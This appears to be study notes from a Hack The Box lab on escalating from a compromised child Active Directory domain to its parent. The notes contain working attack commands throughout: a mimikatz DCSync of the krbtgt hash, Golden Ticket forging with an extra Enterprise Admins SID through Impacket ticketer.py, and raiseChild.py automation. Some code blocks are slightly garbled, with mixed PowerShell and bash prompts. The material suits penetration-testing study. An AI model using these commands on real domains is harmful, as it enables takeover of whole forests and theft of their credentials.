
## Overview

Once you have compromised a child domain, you can perform the same attack from a Linux host using tools like Impacket. The process involves gathering key data points, creating a Golden Ticket, and leveraging it to access resources in the parent domain.

---

## Data Collection

### 1. Obtain the KRBTGT Hash for the Child Domain

```bash
PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

Output example:

```plaintext
Hash NTLM: 9d765b482771505cbe97411065964d5f
```

### 2. Get the SID for the Child Domain

```bash
PS C:\htb> Get-DomainSID
```

Output:

```plaintext
S-1-5-21-2806153819-209893948-922872689
```

### 3. Get the SID of the Parent Domain's Enterprise Admins Group

```bash
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```

Output:

```plaintext
distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  S-1-5-21-3842939050-3880317879-2865463114-519
```

---

## Attack Execution

### 4. Confirm No Access to Parent Domain DC

```bash
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
ls : Access is denied
```

### 5. Create a Golden Ticket with `impacket`'s `ticketer.py`

```bash
bash

PS C:\htb> ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  -user hacker
```

This generates a ticket file (e.g., `ticket.kirbi`) with the specified parameters, including the child and parent domain SIDs.

### 6. Use the Ticket for Access

Set the environment variable to point to the ticket:

```bash

export KRB5CCNAME=./ticket.kirbi
```

### 7. Confirm Ticket in Memory

```bash
klist
```

Expected output:

```plaintext

Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
KerbTicket Encryption Type: RC4-HMAC(NT)
Ticket Flags: forwardable, renewable, initial, pre-authent
Start Time: ...
End Time: ...
```

### 8. Access the Domain Controller

```bash

ls \\academy-ea-dc01.inlanefreight.local\c$
```

If successful, you can now explore or escalate privileges in the parent domain.

---

## Automating with `raiseChild.py`

`raiseChild.py` automates the above process:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

It performs:

- Discovery of child and parent domain info
- Retrieval of `krbtgt` hashes
- Golden Ticket creation
- PSEXEC session on the parent domain